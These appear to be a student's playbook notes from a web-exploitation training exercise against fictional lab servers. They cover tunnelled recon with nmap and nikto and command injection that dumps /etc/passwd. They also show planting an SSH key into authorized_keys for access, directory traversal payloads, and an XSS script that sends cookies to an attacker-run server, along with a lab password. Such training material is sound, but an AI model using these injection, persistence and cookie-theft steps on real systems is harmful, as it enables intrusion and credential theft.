```
Scheme of Maneuver:
>Jump Box: 10.50.37.98
>password: v0cEcUbwIzY878p
->T1:10.100.28.40
-->T2: 10.100.28.55
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
PORTS: 80
OS: Apache/2.4.29 (Ubuntu) Server
Creds:unknown
Last Known SSH Port: 4444
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.

T2
Hostname: Donovian_Training_Websvr
IP: 10.100.28.55
PORTS: 
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
Recon: prerequisites
---------------------------------------------|
	* if no socket file then, make one.  |
ssh -MS /tmp/jump student@10.50.37.98	     |
				^ jump IP    |
					     |
	* if no dynamic port, make one.      |
ssh -S /tmp/jump jump -O forward -D 9050     |
---------------------------------------------|
```
# On lin-ops(1)
Recon: Utilize proxychain tools
* after getting the dynamic tunnel running 

```
proxychains nmap 10.100.28.40
proxychains nmap -Pn -n -T5 {IP}
proxychains nc 10.100.28.40 {port[s]}
proxychains nmap --script http-enum 10.100.28.40
```
* http-enum esults:
* Nmap scan report for 10.100.28.40
```
Host is up (0.00042s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
|   http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
4444/tcp open  krb524

Nmap done: 1 IP address (1 host up) scanned in 3.61 seconds
```
* utilize nikto
```
proxychains nikto v -h 10.100.28.40
```
* from nmap scans:
```
/robots.txt
/css
/images
/uploads
```
* from nikto:
```
/icons/README
/net_test
```
# On lin-ops:
* Utilize your existing Socket file, put in a new port forward:
```
ssh -S /tmp/jump jump -O forward -L 127.0.0.1:1111:10.100.28.40:80
```
* then open a firefox web-browser on your lin-ops station:
```
firefox
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# On firefox:
* navigate to the device via the Port Forward you added to you Socket File:
```
127.0.0.1:1111
```
-------- /robots.txt: -------- 
* from your nmap --script http-enum, you enumerated the robots.txt file.
* try accessing that file from the web-browser
```
http://127.0.0.1:1111/robots.txt
```
* results from /robots.txt:
```
User-agent: *
Disallow: /net_test	
-------- /css --------
	* Now look at the other 3 directories that your nmap script found:
http://127.0.0.1:1111/css
	* ^ results from /css:
Index of /css
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[TXT]	jquery-ui.min.css	2022-03-23 14:33 	31K	 
[TXT]	jquery-ui.theme.min.css	2022-03-23 14:33 	14K	 
[IMG]	ui-bg_diagonals-thick_75_f3d8d8_40x40.png	2022-03-23 14:33 	413 	 
[IMG]	ui-bg_dots-small_65_a6a6a6_2x2.png	2022-03-23 14:33 	207 	 
[IMG]	ui-bg_glass_55_fbf8ee_1x400.png	2022-03-23 14:33 	340 	 
[IMG]	ui-bg_highlight-hard_100_eeeeee_1x100.png	2022-03-23 14:33 	252 	 
[IMG]	ui-bg_highlight-hard_100_f6f6f6_1x100.png	2022-03-23 14:33 	251 	 
[IMG]	ui-bg_highlight-soft_15_cc0000_1x100.png	2022-03-23 14:33 	322 	 
[IMG]	ui-icons_004276_256x240.png	2022-03-23 14:33 	4.4K	 
[IMG]	ui-icons_cc0000_256x240.png	2022-03-23 14:33 	4.4K	 
[IMG]	ui-icons_ffffff_256x240.png	2022-03-23 14:33 	6.2K	 
```
-------- /images --------
```
http://127.0.0.1:1111/images
```
* results from /images:
```
Index of /images
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[IMG]	min_crest.jpeg	2022-03-23 14:33 	6.5K	 
[IMG]	sign.jpeg	2022-03-23 14:33 	10K	 
Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
```
-------- /uploads --------
```
http://127.0.0.1:1111/uploads
```
* ^ results from /uploads:
```
Index of /uploads
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	message	2022-04-19 20:18 	229 	 
Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111
```
* message from uploads
```
Just completed my Cyber Awareness training and it says ATOPIA. Last I checked that is a whole other country.
Please send me a corrected cert with the right now.

I took my online training from the following website

10.100.28.55
```
-------- /net_test --------
* check the /net_test directory:
```
http://127.0.0.1:1111/net_test
```
* ^ results from the /net_test directory
```
Index of /net_test
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	industry_check.php	2022-03-23 14:33 	1.5K	 
Apache/2.4.29 (Ubuntu) Server at 127.0.0.1 Port 1111	
```	
	
* the web-page that the /new_test directory redirects you to has:
		System to ping:
		Path to test:
		Port to check:
* with the input fields enumerated above we can leverage Command Injection. 
	
	* try enumerating /etc/passwd in all the fields provided above ^
	* results for Path to Test:
	* User is billybob
billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash


billybob:x:1001:1001:you found me watkTNrQG4K8go2baNbj:/home/billybob:/bin/bash

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

* after you determine the user's home directory, check to see if they have a .ssh directory:
* if not, make one:
```
; mkdir /home/billybob/.ssh
```
* verify it was created:
```
; ls -la /home/billybob
```
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# on lin-ops:
* get your public key
```
ssh-keygen
ls -l /home/student/.ssh
cat /home/student/.ssh/id_rsa.pub
```
* copy that key over to billybob's /home/billybob/.ssh directory. Into a new file called:	
	* /home/billybob/.ssh/authorized_keys
```
; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaf56Lv5nrgWiIKbzhHLOiqyog8ATYemjQAFZYDA4sGfbVofZR+wOeoazbV3xCW9zQdqYpUZHUvpuIDVhNfc4RuLOurS+kddlJ8lJeh/GWarckQfksCpCtEV9Cd4LFIUsWpbPXF1v68RJY+kE5IP84B6+aM+2gwfSULR9rpSWV+P2npvRV3zmeGCevJqT57sMfKitI6lNpYRVFF6VAl+g4LEtQ2ac1VwfYZl//FTYwpUNS24M6o0quG1L80YD88+p0XwEN+SDifd0Qrx5GIf+yOrEcu75EIg6KLko042f9vIb35XL5AnW5nIu9xNJZcj4OoLX3Ppht3Rja27zRg39n student@lin-ops" >> /home/billybob/.ssh/authorized_keys
```

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```
ssh -MS /tmp/web student@10.50.37.98
ssh -S /tmp/web web -O forward -L 2222:10.100.28.40:4444
ssh billybob@127.0.0.1 -p 2222
ssh -S /tmp/jump jump -O cancel -D9050
ssh -S /tmp/web web -O forward -D9050
```
	# on lin-ops
	* make a new socket, and ssh into the web server, and loggon
	- sendinig private key to encrypt the begging of the conversation. This allows the client to authenticate.
	 ```
	 ssh -i .ssh/id_rsa -MS /tmp/web billybob@127.0.0.1 -p 1111
	 ```
	* Congrats, you did a ssh  masquerade

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# on web server: Directory Traversal via HTTP POST/GET methods:
```
http://10.50.28.11/path/pathdemo.php
```

 * POST method: It cat's so try
```
../../../../../etc/passwd
```
* do ^ at least 8 times to be safe

* GET method: interacting with radio buttons, changing the url on the website.
	
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# on lin-ops:
* make a http server via python3:
```
python3 -m http.server
```
* then put script on webpage
```	
<script>document.location="http://10.50.27.61:8000/?" + document.cookie;</script>
```
* lin-ops IP:10.50.27.61:8000 ^^^
